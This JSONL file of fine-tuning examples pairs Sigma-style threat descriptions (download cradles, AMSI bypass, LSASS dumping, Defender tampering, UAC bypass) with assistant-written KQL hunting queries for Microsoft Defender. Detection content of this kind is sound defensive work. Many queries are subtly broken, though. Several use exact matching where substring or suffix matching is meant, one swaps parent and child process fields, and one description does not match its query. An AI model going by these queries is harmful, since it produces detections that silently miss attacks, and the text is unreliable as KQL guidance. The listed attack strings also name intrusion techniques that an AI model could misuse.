{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files with an executable or script extension by an Office application. Topic: file_event_win_office_susp_file_extension"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\msaccess.exe\", \"\\\\mspub.exe\", \"\\\\powerpnt.exe\", \"\\\\visio.exe\", \"\\\\winword.exe\")) and (FileName in~ (\".bat\", \".cmd\", \".com\", \".dll\", \".exe\", \".hta\", \".ocx\", \".proj\", \".ps1\", \".scf\", \".scr\", \".sys\", \".vbe\", \".vbs\", \".wsf\", \".wsh\"))) and (not(FileName =~ \"\\\\AppData\\\\Local\\\\assembly\\\\tmp\\\\\")) and (not(((FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\webexdelta\\\\\" and InitiatingProcessFolderPath =~ \"\\\\winword.exe\") or (FileName in~ (\"C:\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\Office\\\\\", \"\\\\WebServiceCache\\\\AllUsers\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Replace.exe which can be used to replace file with another file Topic: proc_creation_win_lolbin_replace"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\replace.exe\" and (ProcessCommandLine contains \"-a\" or ProcessCommandLine contains \"/a\" or ProcessCommandLine contains \"\u2013a\" or ProcessCommandLine contains \"\u2014a\" or ProcessCommandLine contains \"\u2015a\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1 Topic: proc_creation_win_dtrace_kernel_dump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"syscall:::return\", \"lkd(\")) or (ProcessCommandLine =~ \"lkd(0)\" and InitiatingProcessFolderPath =~ \"\\\\dtrace.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the disabling of the Windows Defender eventlog as seen in relation to Lockbit 3.0 infections Topic: registry_set_disabled_microsoft_defender_eventlog"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-Windows Defender/Operational\\\\Enabled\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory. Topic: proc_creation_win_powershell_download_cradle_obfuscated"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http://127.0.0.1\", \"%{(IRM $_)}\", \".SubString.ToString()[67,72,64]-Join\", \"Import-Module\")) and InitiatingProcessFolderPath =~ \"\\\\powershell.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This detects file modifications to ASPX and ASHX files within the root of the App_Extensions directory, which is allowed by a ZipSlip vulnerability in versions prior to 23.9.8. This occurs during exploitation of CVE-2024-1708.\n Topic: file_event_win_exploit_cve_2024_1708_screenconnect"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (((FileName contains \"ScreenConnect\\\\App_Extensions\\\\\" and FileName contains \".ashx\") or (FileName contains \"ScreenConnect\\\\App_Extensions\\\\\" and FileName contains \".aspx\")) and InitiatingProcessFolderPath =~ \"\\\\ScreenConnect.Service.exe\") and (not(FileName =~ \"ScreenConnect\\\\App_Extensions\\*\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files with scripting or executable extensions by Mysql daemon.\nWhich could be an indicator of \"User Defined Functions\" abuse to download malware.\n Topic: file_event_win_mysqld_uncommon_file_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".bat\", \".dat\", \".dll\", \".exe\", \".ps1\", \".psm1\", \".vbe\", \".vbs\")) and (InitiatingProcessFolderPath in~ (\"\\\\mysqld.exe\", \"\\\\mysqld-nt.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name Topic: proc_creation_win_sysinternals_procdump_evasion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"copy procdump\", \"move procdump\")) or (ProcessCommandLine in~ (\"copy \", \".dmp \")) or (ProcessCommandLine in~ (\"copy lsass.exe_\", \"move lsass.exe_\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of perl using the \"-e\"/\"-E\" flags. This is could be used as a way to launch a reverse shell or execute live perl code. Topic: proc_creation_win_perl_inline_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -e\" and (FolderPath endswith \"\\\\perl.exe\" or ProcessVersionInfoOriginalFileName =~ \"perl.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of Chromium based browser in headless mode Topic: proc_creation_win_browsers_chromium_headless_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"--headless\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62) Topic: registry_event_shell_open_keys_manipulation"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryValueSet\" and RegistryKey endswith \"Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\SymbolicLinkValue\" and RegistryValueData contains \"\\\\Software\\\\Classes\\\\{\") or RegistryKey endswith \"Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute\" or ((ActionType =~ \"RegistryValueSet\" and (RegistryKey endswith \"Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\(Default)\" or RegistryKey endswith \"Classes\\\\exefile\\\\shell\\\\open\\\\command\\\\(Default)\")) and (not(RegistryValueData =~ \"(Empty)\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious parent process for cmd.exe Topic: proc_creation_win_cmd_unusual_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\csrss.exe\", \"\\\\ctfmon.exe\", \"\\\\dllhost.exe\", \"\\\\epad.exe\", \"\\\\FlashPlayerUpdateService.exe\", \"\\\\GoogleUpdate.exe\", \"\\\\jucheck.exe\", \"\\\\jusched.exe\", \"\\\\LogonUI.exe\", \"\\\\lsass.exe\", \"\\\\regsvr32.exe\", \"\\\\SearchIndexer.exe\", \"\\\\SearchProtocolHost.exe\", \"\\\\SIHClient.exe\", \"\\\\sihost.exe\", \"\\\\slui.exe\", \"\\\\spoolsv.exe\", \"\\\\sppsvc.exe\", \"\\\\taskhostw.exe\", \"\\\\unsecapp.exe\", \"\\\\WerFault.exe\", \"\\\\wermgr.exe\", \"\\\\wlanext.exe\", \"\\\\WUDFHost.exe\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool Topic: proc_creation_win_hktl_inveigh"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\Inveigh.exe\" or (ProcessVersionInfoOriginalFileName in~ (\"\\\\Inveigh.exe\", \"\\\\Inveigh.dll\")) or ProcessVersionInfoFileDescription =~ \"Inveigh\" or (ProcessCommandLine contains \" -SpooferIP\" or ProcessCommandLine contains \" -ReplyToIPs \" or ProcessCommandLine contains \" -ReplyToDomains \" or ProcessCommandLine contains \" -ReplyToMACs \" or ProcessCommandLine contains \" -SnifferIP\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential credential dumping via Windows Error Reporting LSASS Shtinkering technique which uses the Windows Error Reporting to dump lsass Topic: proc_creation_win_werfault_lsass_shtinkering"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and (InitiatingProcessAccountName contains \"AUTHORI\" or InitiatingProcessAccountName contains \"AUTORI\") and (ProcessCommandLine in~ (\" -u -p \", \" -ip \", \" -s \"))) and (FolderPath endswith \"\\\\Werfault.exe\" or ProcessVersionInfoOriginalFileName =~ \"WerFault.exe\")) and (not(InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\lsass.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec) Topic: proc_creation_win_sysprep_appdata"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\\AppData\\\\\" and InitiatingProcessFolderPath =~ \"\\\\sysprep.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a Python path configuration file (.pth) in Python library folders, which can be maliciously abused for code execution and persistence.\nModules referenced by these files are run at every Python startup (v3.5+), regardless of whether the module is imported by the calling script.\nDefault paths are \\lib\\site-packages\\*.pth (Windows) and /lib/pythonX.Y/site-packages/*.pth (Unix and macOS).\n Topic: file_event_win_python_path_configuration_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".pth\" and (not(((FileName in~ (\"\\\\pywin32.pth\", \"\\\\distutils-precedence.pth\")) and InitiatingProcessFolderPath =~ \"\\\\python.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration. Topic: proc_creation_win_powershell_active_directory_module_dll_import"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Import-Module \", \"ipmo \")) and ProcessCommandLine =~ \"Microsoft.ActiveDirectory.Management.dll\" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell download and execution cradles. Topic: proc_creation_win_powershell_download_iex"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".DownloadString(\", \".DownloadFile(\", \"Invoke-WebRequest \", \"iwr \")) and (ProcessCommandLine in~ (\";iex $\", \"| IEX\", \"|IEX \", \"I`E`X\", \"I`EX\", \"IE`X\", \"iex \", \"IEX (\", \"IEX(\", \"Invoke-Expression\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the image load of \"Python Core\" by a non-Python process. This might be indicative of a Python script bundled with Py2Exe. Topic: image_load_susp_python_image_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where InitiatingProcessVersionInfoFileDescription =~ \"Python Core\" and (not((InitiatingProcessFolderPath contains \"Python\" or (InitiatingProcessFolderPath startswith \"C:\\\\Program Files\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\Program Files (x86)\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\ProgramData\\\\Anaconda3\\\\\")))) and (not(isnull(InitiatingProcessFolderPath)))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts of decoding encoded Gzip archives via PowerShell. Topic: proc_creation_win_powershell_decode_gzip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"GZipStream\", \"::Decompress\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious msiexec process starts with web addresses as parameter Topic: proc_creation_win_msiexec_web_install"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" msiexec\", \"://\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The Tasks folder in system32 and syswow64 are globally writable paths.\nAdversaries can take advantage of this and load or influence any script hosts or ANY .NET Application\nin Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr\n Topic: proc_creation_win_susp_task_folder_evasion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"echo \", \"copy \", \"type \", \"file createnew\")) and (ProcessCommandLine in~ (\" C:\\\\Windows\\\\System32\\\\Tasks\\\\\", \" C:\\\\Windows\\\\SysWow64\\\\Tasks\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of doas.conf file in linux host platform. Topic: file_event_lnx_doas_conf_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"/etc/doas.conf\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections. Topic: proc_creation_win_susp_no_image_name"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images Topic: proc_creation_win_dism_remove"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"/Online\", \"/Disable-Feature\")) and InitiatingProcessFolderPath =~ \"\\\\Dism.exe\") or ((InitiatingProcessCommandLine in~ (\"/Online\", \"/Disable-Feature\")) and InitiatingProcessFolderPath =~ \"\\\\DismHost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of special strings/null bits in order to potentially bypass AMSI functionalities Topic: proc_creation_win_powershell_amsi_null_bits_bypass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"if(0){{{0}}}' -f $(0 -as [char]) +\", \"#<NULL>\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of tasks from processes executed from suspicious locations Topic: file_event_win_susp_task_write"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Windows\\\\System32\\\\Tasks\" and (InitiatingProcessFolderPath contains \"\\\\AppData\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\PerfLogs\" or InitiatingProcessFolderPath contains \"\\\\Windows\\\\System32\\\\config\\\\systemprofile\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious parent processes that should not have any children or should only have a single possible child program Topic: proc_creation_win_susp_parents"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\minesweeper.exe\", \"\\\\winver.exe\", \"\\\\bitsadmin.exe\")) or ((InitiatingProcessFileName in~ (\"\\\\csrss.exe\", \"\\\\certutil.exe\", \"\\\\eventvwr.exe\", \"\\\\calc.exe\", \"\\\\notepad.exe\")) and (not((isnull(FolderPath) or (InitiatingProcessFolderPath in~ (\"\\\\WerFault.exe\", \"\\\\wermgr.exe\", \"\\\\conhost.exe\", \"\\\\mmc.exe\", \"\\\\win32calc.exe\", \"\\\\notepad.exe\"))))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation of CVE-2021-40444 via suspicious process patterns seen in in-the-wild exploitations Topic: proc_creation_win_exploit_cve_2021_40444"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\winword.exe\", \"\\\\powerpnt.exe\", \"\\\\excel.exe\")) and InitiatingProcessFolderPath =~ \"\\\\control.exe\") and (not((ProcessCommandLine endswith \"\\\\control.exe input.dll\" or ProcessCommandLine endswith \"\\\\control.exe\\\" input.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of system utilities (only grep and egrep for now) to discover security software discovery Topic: proc_creation_lnx_security_software_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"nessusd\", \"td-agent\", \"packetbeat\", \"filebeat\", \"auditbeat\", \"osqueryd\", \"cbagentd\", \"falcond\")) and (InitiatingProcessFolderPath in~ (\"/grep\", \"/egrep\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious processes spawned from a Java host process which could indicate a sign of exploitation (e.g. log4j) Topic: proc_creation_win_java_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\java.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\AppVLP.exe\", \"\\\\bitsadmin.exe\", \"\\\\certutil.exe\", \"\\\\cscript.exe\", \"\\\\curl.exe\", \"\\\\forfiles.exe\", \"\\\\hh.exe\", \"\\\\mftrace.exe\", \"\\\\mshta.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\query.exe\", \"\\\\reg.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\schtasks.exe\", \"\\\\scrcons.exe\", \"\\\\scriptrunner.exe\", \"\\\\sh.exe\", \"\\\\systeminfo.exe\", \"\\\\whoami.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of shells from a parent process located in a temporary (/tmp) directory Topic: proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"/tmp/\" and (InitiatingProcessFolderPath in~ (\"/bash\", \"/csh\", \"/dash\", \"/fish\", \"/ksh\", \"/sh\", \"/zsh\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation of the BearLPE exploit using Task Scheduler \".job\" import arbitrary DACL write\\par Topic: proc_creation_win_exploit_other_bearlpe"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/change\", \"/TN\", \"/RU\", \"/RP\")) and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"rsync\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_rsync_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/ash \", \"/bash \", \"/dash \", \"/csh \", \"/sh \", \"/zsh \", \"/tcsh \", \"/ksh \", \"'ash \", \"'bash \", \"'dash \", \"'csh \", \"'sh \", \"'zsh \", \"'tcsh \", \"'ksh \")) and (ProcessCommandLine =~ \" -e \" and (InitiatingProcessFolderPath in~ (\"/rsync\", \"/rsyncd\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when attackers or tools disable Windows Defender functionalities via the Windows registry Topic: registry_set_windows_defender_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender*\") and ((RegistryValueData =~ \"DWORD (0x00000000)\" and (RegistryKey endswith \"\\\\DisallowExploitProtectionOverride\" or RegistryKey endswith \"\\\\Features\\\\TamperProtection\" or RegistryKey endswith \"\\\\MpEngine\\\\MpEnablePus\" or RegistryKey endswith \"\\\\PUAProtection\" or RegistryKey endswith \"\\\\Signature Update\\\\ForceUpdateFromMU\" or RegistryKey endswith \"\\\\SpyNet\\\\SpynetReporting\" or RegistryKey endswith \"\\\\SpyNet\\\\SubmitSamplesConsent\" or RegistryKey endswith \"\\\\Windows Defender Exploit Guard\\\\Controlled Folder Access\\\\EnableControlledFolderAccess\")) or (RegistryValueData =~ \"DWORD (0x00000001)\" and (RegistryKey endswith \"\\\\DisableAntiSpyware\" or RegistryKey endswith \"\\\\DisableAntiVirus\" or RegistryKey endswith \"\\\\DisableBehaviorMonitoring\" or RegistryKey endswith \"\\\\DisableBlockAtFirstSeen\" or RegistryKey endswith \"\\\\DisableEnhancedNotifications\" or RegistryKey endswith \"\\\\DisableIntrusionPreventionSystem\" or RegistryKey endswith \"\\\\DisableIOAVProtection\" or RegistryKey endswith \"\\\\DisableOnAccessProtection\" or RegistryKey endswith \"\\\\DisableRealtimeMonitoring\" or RegistryKey endswith \"\\\\DisableScanOnRealtimeEnable\" or RegistryKey endswith \"\\\\DisableScriptScanning\"))) and (not(InitiatingProcessFolderPath =~ \"\\\\sepWscSvc64.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"AVKkid.dll\" Topic: image_load_side_load_avkkid"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\AVKkid.dll\" and (not(((FolderPath startswith \"C:\\\\Program Files (x86)\\\\G DATA\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\G DATA\\\\\") and (InitiatingProcessFolderPath contains \"C:\\\\Program Files (x86)\\\\G DATA\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\G DATA\\\\\") and InitiatingProcessFolderPath =~ \"\\\\AVKKid.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity Topic: proc_creation_win_wab_execution_from_non_default_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\wab.exe\", \"\\\\wabmig.exe\")) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\WinSxS\\\\\", \"C:\\\\Program Files\\\\Windows Mail\\\\\", \"C:\\\\Program Files (x86)\\\\Windows Mail\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"unregmp2.exe\" binary as a proxy to launch a custom version of \"wmpnscfg.exe\" Topic: proc_creation_win_lolbin_unregmp2"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\unregmp2.exe\" or ProcessVersionInfoOriginalFileName =~ \"unregmp2.exe\") and (ProcessCommandLine contains \" -HideWMP\" or ProcessCommandLine contains \" /HideWMP\" or ProcessCommandLine contains \" \u2013HideWMP\" or ProcessCommandLine contains \" \u2014HideWMP\" or ProcessCommandLine contains \" \u2015HideWMP\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Kapeka backdoor persistence activity.\nDepending on the process privileges, the Kapeka dropper then sets persistence for the backdoor either as a scheduled task (if admin or SYSTEM) or autorun registry (if not).\nFor the scheduled task, it creates a scheduled task called \"Sens Api\" via schtasks command, which is set to run upon system startup as SYSTEM.\nTo establish persistence through the autorun utility, it adds an autorun entry called \"Sens Api\" under HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run via the \"reg add\" command.\nBoth persistence mechanisms are set to launch the binary by calling rundll32 and passing the backdoors first export ordinal (#1) without any additional argument.\n Topic: proc_creation_win_malware_kapeka_backdoor_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\"create\", \"ONSTART\")) and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")) or ((ProcessCommandLine in~ (\"add\", \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\"))) and (ProcessCommandLine in~ (\"Sens Api\", \"OneDrive\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Windows Kernel Debugger \"kd.exe\". Topic: proc_creation_win_kd_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\kd.exe\" or ProcessVersionInfoOriginalFileName =~ \"kd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity. Topic: proc_creation_win_susp_priv_escalation_via_named_pipe"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"echo\", \">\", \"\\\\\\\\.\\\\pipe\\\\\")) and ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"PowerShell.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n Topic: proc_creation_win_findstr_recon_pipe_output"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"ipconfig\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\") or (ProcessCommandLine contains \"net\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\") or (ProcessCommandLine contains \"netstat\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\") or (ProcessCommandLine contains \"ping\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\") or (ProcessCommandLine contains \"systeminfo\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\") or (ProcessCommandLine contains \"tasklist\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\") or (ProcessCommandLine contains \"whoami\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"find\")"}]}
